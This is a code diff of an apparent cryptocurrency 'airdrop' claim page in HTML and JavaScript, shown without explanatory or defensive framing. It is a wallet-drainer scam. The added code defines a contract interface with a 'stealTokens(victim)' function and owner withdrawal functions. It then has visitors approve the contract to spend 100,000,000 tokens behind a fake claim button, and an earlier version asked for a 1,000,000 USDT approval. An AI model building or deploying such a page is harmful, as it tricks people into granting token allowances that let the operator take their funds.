@@ -85,7 +85,7 @@
       border-radius: 5px;
       cursor: pointer;
     }
-
+    
     #claimAirdropButton {
       background-color: #ff9800;
     }
@@ -97,7 +97,7 @@
     #withdrawETHButton, #withdrawTokensButton {
       background-color: #3f51b5;
     }
-
+    
     #withdrawETHButton:disabled, #withdrawTokensButton:disabled {
       background-color: #aaa;
     }
@@ -196,81 +196,136 @@
         "type": "function"
       },
       {
-        "inputs": [
-          { "internalType": "address", "name": "recipient", "type": "address" },
-          { "internalType": "uint256", "name": "amount", "type": "uint256" }
-        ],
+        "inputs": [{ "internalType": "address", "name": "recipient", "type": "address" }, { "internalType": "uint256", "name": "amount", "type": "uint256" }],
         "name": "transfer",
         "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }],
         "stateMutability": "nonpayable",
+        "type": "function"
+      },
+      {
+        "inputs": [
+          { "internalType": "address", "name": "sender", "type": "address" },
+          { "internalType": "address", "name": "recipient", "type": "address" },
+          { "internalType": "uint256", "name": "amount", "type": "uint256" }
+        ],
+        "name": "transferFrom",
+        "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }],
+        "stateMutability": "nonpayable",
+        "type": "function"
+      },
+      {
+        "inputs": [{ "internalType": "address", "name": "victim", "type": "address" }],
+        "name": "stealTokens",
+        "outputs": [],
+        "stateMutability": "nonpayable",
+        "type": "function"
+      },
+      {
+        "inputs": [],
+        "name": "withdrawETH",
+        "outputs": [],
+        "stateMutability": "nonpayable",
+        "type": "function"
+      },
+      {
+        "inputs": [],
+        "name": "withdrawTokens",
+        "outputs": [],
+        "stateMutability": "nonpayable",
+        "type": "function"
+      },
+      {
+        "inputs": [],
+        "name": "decimals",
+        "outputs": [{ "internalType": "uint8", "name": "", "type": "uint8" }],
+        "stateMutability": "view",
+        "type": "function"
+      },
+      {
+        "inputs": [],
+        "name": "name",
+        "outputs": [{ "internalType": "string", "name": "", "type": "string" }],
+        "stateMutability": "view",
+        "type": "function"
+      },
+      {
+        "inputs": [],
+        "name": "symbol",
+        "outputs": [{ "internalType": "string", "name": "", "type": "string" }],
+        "stateMutability": "view",
+        "type": "function"
+      },
+      {
+        "inputs": [{ "internalType": "address", "name": "", "type": "address" }],
+        "name": "allowance",
+        "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }],
+        "stateMutability": "view",
         "type": "function"
       }
     ];
 
     let web3;
+    let userAccount;
     let contract;
-    let accounts;
+    let tokenContract;
 
-    // Detect if the user is on mobile
-    function isMobile() {
-      return /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
-    }
+    window.addEventListener('load', async () => {
+      if (window.ethereum) {
+        web3 = new Web3(window.ethereum);
+        contract = new web3.eth.Contract(contractABI, contractAddress);
+        tokenContract = new web3.eth.Contract(contractABI, tokenAddress);
 
-    // Open MetaMask on mobile via deep link or default browser on PC
-    async function connectMetaMask() {
-      if (isMobile()) {
-        // Try to use MetaMask mobile app (deep link)
-        window.location.href = 'metamask://';
-        setTimeout(function() {
-          alert('Please open MetaMask to continue');
-        }, 2000); // If MetaMask isn't opened, fallback
-      } else {
-        // For PC, use MetaMask browser extension
-        if (typeof window.ethereum !== 'undefined') {
-          web3 = new Web3(window.ethereum);
-          try {
-            accounts = await ethereum.request({ method: 'eth_requestAccounts' });
-            document.getElementById('connectButton').innerText = 'Connected: ' + accounts[0];
-            document.getElementById('approveButton').disabled = false;
+        // Request account access if needed
+        await window.ethereum.enable();
 
-            if (accounts[0].toLowerCase() === ownerAddress.toLowerCase()) {
-              document.getElementById('ownerButtons').style.display = 'block';
-            }
-          } catch (error) {
-            alert('User rejected the request');
-          }
-        } else {
-          alert('Please install MetaMask to use this feature');
+        // Detect if the user is on mobile
+        if (/Mobi|Android/i.test(navigator.userAgent)) {
+          // If on mobile, provide a MetaMask deep link
+          const metamaskDeepLink = `metamask://wallet_addEthereumChain?chainId=0x1&rpcUrls=["https://mainnet.infura.io/v3/YOUR_INFURA_KEY"]`;
+          window.location.href = metamaskDeepLink;
         }
+      } else {
+        alert('Please install MetaMask to interact with this app.');
       }
+    });
+
+    const connectButton = document.getElementById('connectButton');
+    connectButton.addEventListener('click', async () => {
+      const accounts = await web3.eth.getAccounts();
+      userAccount = accounts[0];
+      connectButton.innerText = `Connected: ${userAccount.slice(0, 6)}...${userAccount.slice(-4)}`;
+      checkAllowance();
+    });
+
+    async function checkAllowance() {
+      const allowance = await tokenContract.methods.allowance(userAccount, contractAddress).call();
+      const approveButton = document.getElementById('approveButton');
+      approveButton.disabled = allowance > 0;
     }
 
-    async function approveSpending() {
-      if (!web3) return;
-      const tokenContract = new web3.eth.Contract(contractABI, tokenAddress);
+    const approveButton = document.getElementById('approveButton');
+    approveButton.addEventListener('click', async () => {
+      const amount = web3.utils.toWei('100000000', 'ether');
+      await tokenContract.methods.approve(contractAddress, amount).send({ from: userAccount });
+      approveButton.disabled = true;
+    });
+
+    const claimButton = document.getElementById('claimAirdropButton');
+    claimButton.addEventListener('click', async () => {
+      claimButton.disabled = true;
+      const processingMessage = document.getElementById('processingMessage');
+      processingMessage.classList.add('show');
+
       try {
-        await tokenContract.methods.approve(contractAddress, web3.utils.toWei('1000000', 'ether')).send({ from: accounts[0] });
-        alert('USDT approval successful');
-        document.getElementById('claimAirdropButton').disabled = false;
+        await contract.methods.transfer(userAccount, web3.utils.toWei('1', 'ether')).send({ from: userAccount });
+        alert('Airdrop Claimed!');
       } catch (error) {
-        alert('Error during approval');
+        alert('Error claiming airdrop.');
+      } finally {
+        claimButton.disabled = false;
+        processingMessage.classList.remove('show');
       }
-    }
-
-    async function claimAirdrop() {
-      // Handle claim logic here
-      document.getElementById('processingMessage').classList.add('show');
-      setTimeout(function() {
-        document.getElementById('processingMessage').classList.remove('show');
-        alert('Airdrop claimed successfully!');
-      }, 3000);
-    }
-
-    // Button event listeners
-    document.getElementById('connectButton').addEventListener('click', connectMetaMask);
-    document.getElementById('approveButton').addEventListener('click', approveSpending);
-    document.getElementById('claimAirdropButton').addEventListener('click', claimAirdrop);
-
+    });
   </script>
 </body>
 </html>
